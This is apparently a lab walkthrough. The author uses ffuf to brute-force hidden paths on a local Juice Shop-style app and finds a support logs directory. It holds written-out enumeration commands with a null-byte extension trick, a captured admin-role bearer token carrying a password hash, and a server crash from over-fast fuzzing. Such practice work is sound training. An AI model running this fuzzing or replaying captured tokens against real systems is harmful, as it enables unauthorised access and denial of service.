- Use `ffuf` for bruteforcing
```
ffuf -u http://localhost:3000/FUZZ \
     -w SecLists/Discovery/Web-Content/raft-large-files.txt \
     -fs 9903 \
     -e .log%2500.md \
     -c -ac \
     -recursion -recursion-depth 3 \
     -t 40 \
     -o recon.json -of json
```
- The app crashes!
```
[...]
<--- Last few GCs --->

[1:0xffff985e0000]  1068723 ms: Scavenge (interleaved) 2028.4 (2039.9) -> 2022.9 (2040.9) MB, pooled: 0 MB, 9.41 / 0.01 ms  (average mu = 0.308, current mu = 0.267) allocation failure; 
[1:0xffff985e0000]  1069393 ms: Mark-Compact (reduce) 2029.4 (2041.9) -> 2020.9 (2027.1) MB, pooled: 0 MB, 25.38 / 0.05 ms  (+ 517.6 ms in 105 steps since start of marking, biggest step 6.1 ms, walltime since start of marking 584 ms) (average mu = 0.342, 
FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory
----- Native stack trace -----

 1: 0x73f17c node::OOMErrorHandler(char const*, v8::OOMDetails const&) [/nodejs/bin/node]
 2: 0xbaaa3c  [/nodejs/bin/node]
 3: 0xbaab14  [/nodejs/bin/node]
 4: 0xe26dac  [/nodejs/bin/node]
 5: 0xe26ddc  [/nodejs/bin/node]
 6: 0xe27134  [/nodejs/bin/node]
 7: 0xe368e4  [/nodejs/bin/node]
 8: 0xe3a544  [/nodejs/bin/node]
 9: 0x1822824  [/nodejs/bin/node]
```
- It seems that `ffuf` exhausted the Node.js server's memory, leading to a fatal heap allocation failure. (pointing a fast fuzzer like `ffuf` at the application without rate-limiting overwhelmed the server with thousands of concurrent error-generating requests)
- Update the command by reducing threads to `-t 1` and lowering rate `-rate 100`
```
ffuf -u http://localhost:3000/FUZZ \
     -w SecLists/Discovery/Web-Content/raft-large-files.txt \
     -fs 9903 \
     -e .log%2500.md \
     -c -ac -ic \
     -recursion -recursion-depth 3 \
     -t 1 \
     -rate 100 \
     -o recon.json -of json
```
- Actually, I think I should use the directory list and signed in as `support`, as `support` usually needs to view access log. (I got the authorization header through burp)
```
ffuf -u http://localhost:3000/FUZZ \
     -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjo2LCJ1c2VybmFtZSI6IiIsImVtYWlsIjoic3VwcG9ydEBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMzg2OTQzM2Q3NGUzZDBjODZmZDI1NTYyZjgzNmJjODIiLCJyb2xlIjoiYWRtaW4iLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0QWRtaW4ucG5nIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI2LTA3LTIwIDE2OjE1OjM3LjcxNyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI2LTA3LTIwIDE2OjE1OjM3LjcxNyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJiaWQiOjYsImlhdCI6MTc4NDU3MjUwMX0.MKYVraJoTxwVmPEvMLtz2E3dgFNCy8DF_kWNkL4tL2UzZTx28qpDJK0gRwRBx9gJdcyIPGXl556QNTCm3lTmMn4s1n4H037h2uEDQwnTCawDJpfp5J2eVl06BaPhsOT8iv4ikwJ_QlMZRLmI1F4CV2iDWAiky0w15uA8HSu9zx0" \
     -w SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
     -c -ac -ic \
     -recursion -recursion-depth 3 \
     -t 1 \
     -rate 150 \
     -o recon.json -of json
```
- Nothing useful
- Try another list `Fuzzing/LFI/LFI-Jhaddix.txt`
```
ffuf -u http://localhost:3000/FUZZ \
     -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjo2LCJ1c2VybmFtZSI6IiIsImVtYWlsIjoic3VwcG9ydEBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMzg2OTQzM2Q3NGUzZDBjODZmZDI1NTYyZjgzNmJjODIiLCJyb2xlIjoiYWRtaW4iLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0QWRtaW4ucG5nIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI2LTA3LTIwIDE2OjE1OjM3LjcxNyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI2LTA3LTIwIDE2OjE1OjM3LjcxNyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJiaWQiOjYsImlhdCI6MTc4NDU3MjUwMX0.MKYVraJoTxwVmPEvMLtz2E3dgFNCy8DF_kWNkL4tL2UzZTx28qpDJK0gRwRBx9gJdcyIPGXl556QNTCm3lTmMn4s1n4H037h2uEDQwnTCawDJpfp5J2eVl06BaPhsOT8iv4ikwJ_QlMZRLmI1F4CV2iDWAiky0w15uA8HSu9zx0" \
     -w SecLists/Fuzzing/LFI/LFI-Jhaddix.txt \
     -c -ac -ic \
     -recursion -recursion-depth 3 \
     -t 1 \
     -rate 150 \
     -o recon.json -of json
```
- No luck
- I wonder if it is a path with two path segments that aren't independently discoverable. If `/dir/` by itself isn't a real, separately-responding directory, then `ffuf`'s recursion never has anything valid to descend into in the first place.
- I would stop relying on recursion, and directly brute-force the combined two-segment path instead.
```
ffuf -u http://localhost:3000/FUZZ1/FUZZ2 \
     -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjo2LCJ1c2VybmFtZSI6IiIsImVtYWlsIjoic3VwcG9ydEBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMzg2OTQzM2Q3NGUzZDBjODZmZDI1NTYyZjgzNmJjODIiLCJyb2xlIjoiYWRtaW4iLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0QWRtaW4ucG5nIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI2LTA3LTIwIDE2OjE1OjM3LjcxNyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI2LTA3LTIwIDE2OjE1OjM3LjcxNyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJiaWQiOjYsImlhdCI6MTc4NDU3MjUwMX0.MKYVraJoTxwVmPEvMLtz2E3dgFNCy8DF_kWNkL4tL2UzZTx28qpDJK0gRwRBx9gJdcyIPGXl556QNTCm3lTmMn4s1n4H037h2uEDQwnTCawDJpfp5J2eVl06BaPhsOT8iv4ikwJ_QlMZRLmI1F4CV2iDWAiky0w15uA8HSu9zx0" \
     -w SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt:FUZZ1 \
     -w SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt:FUZZ2 \
     -c -ac -ic \
     -t 1 \
     -rate 150 \
     -o recon.json -of json
```
- See responses like 
```
[Status: 500, Size: 1043, Words: 153, Lines: 50, Duration: 2ms]
    * FUZZ1: profile
    * FUZZ2: 

[Status: 200, Size: 2232676, Words: 10256, Lines: 8773, Duration: 6ms]
    * FUZZ1: video
    * FUZZ2: 

[Status: 500, Size: 2531, Words: 219, Lines: 50, Duration: 2ms]
    * FUZZ1: redirect
    * FUZZ2: 

[Status: 200, Size: 11274, Words: 1581, Lines: 358, Duration: 1ms]
    * FUZZ1: ftp
    * FUZZ2: 

[Status: 500, Size: 2410, Words: 210, Lines: 50, Duration: 2ms]
    * FUZZ1: api
    * FUZZ2: 

```
- I should ignore the empty line in the file
```
ffuf -u http://localhost:3000/FUZZ1/FUZZ2 \
     -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjo2LCJ1c2VybmFtZSI6IiIsImVtYWlsIjoic3VwcG9ydEBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMzg2OTQzM2Q3NGUzZDBjODZmZDI1NTYyZjgzNmJjODIiLCJyb2xlIjoiYWRtaW4iLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0QWRtaW4ucG5nIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI2LTA3LTIwIDE2OjE1OjM3LjcxNyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI2LTA3LTIwIDE2OjE1OjM3LjcxNyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJiaWQiOjYsImlhdCI6MTc4NDU3MjUwMX0.MKYVraJoTxwVmPEvMLtz2E3dgFNCy8DF_kWNkL4tL2UzZTx28qpDJK0gRwRBx9gJdcyIPGXl556QNTCm3lTmMn4s1n4H037h2uEDQwnTCawDJpfp5J2eVl06BaPhsOT8iv4ikwJ_QlMZRLmI1F4CV2iDWAiky0w15uA8HSu9zx0" \
     -w SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt:FUZZ1 \
     -w <(grep -i 'log' SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt):FUZZ2 \
     -c -ac -ic \
     -t 1 \
     -rate 150 \
     -o recon.json -of json
```
- This still takes forever so I will directly try with a custom FUZZ2 with these 3, which are my best guesses for the log file name for now.
```
log
logs
access.log
```


```
ffuf -u http://localhost:3000/FUZZ1/FUZZ2 \
     -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjo2LCJ1c2VybmFtZSI6IiIsImVtYWlsIjoic3VwcG9ydEBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMzg2OTQzM2Q3NGUzZDBjODZmZDI1NTYyZjgzNmJjODIiLCJyb2xlIjoiYWRtaW4iLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0QWRtaW4ucG5nIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI2LTA3LTIwIDE2OjE1OjM3LjcxNyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI2LTA3LTIwIDE2OjE1OjM3LjcxNyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJiaWQiOjYsImlhdCI6MTc4NDU3MjUwMX0.MKYVraJoTxwVmPEvMLtz2E3dgFNCy8DF_kWNkL4tL2UzZTx28qpDJK0gRwRBx9gJdcyIPGXl556QNTCm3lTmMn4s1n4H037h2uEDQwnTCawDJpfp5J2eVl06BaPhsOT8iv4ikwJ_QlMZRLmI1F4CV2iDWAiky0w15uA8HSu9zx0" \
     -w SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt:FUZZ1 \
     -w <(printf "%s\n" log logs access.log):FUZZ2 \
     -c -ac -ic \
     -t 1 \
     -rate 150 \
     -o recon.json -of json
```
- Bingo, see
```
[...]
[Status: 200, Size: 8891, Words: 1483, Lines: 346, Duration: 29ms]
    * FUZZ1: support
    * FUZZ2: logs
[...]
```
- Go to http://localhost:3000/support/logs
- Downloadn `access.log.2026-07-22`
- Complete the challenge